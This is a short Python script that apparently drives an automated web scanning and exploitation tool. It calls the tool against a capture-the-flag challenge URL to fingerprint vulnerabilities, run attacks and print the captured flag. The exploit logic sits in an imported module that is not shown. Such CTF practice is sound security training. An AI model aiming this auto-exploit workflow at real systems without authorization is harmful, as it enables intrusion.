import sys, os
sys.path.insert(0, '.')
from yang_web.core.url_analyzer import analyze_url, auto_exploit

url = 'http://80-a4a01c12-a957-470b-8673-3ad7af9e202e.challenge.ctfplus.cn'
print("Analyzing...")
result = analyze_url(url)
fp = result.get('fingerprint', {})
for r in result['results']:
    print(f"  {r['type']} {r['confidence']}% params={r['params']}")

print("\nAuto exploiting...")
final = auto_exploit(url, result['results'], fingerprint=fp)
print(f"Flag: {final.get('flag')}")
print(f"Attacks: {final.get('attacks_run')}")
print(f"Timing: {final.get('timing_ms')/1000:.1f}s")
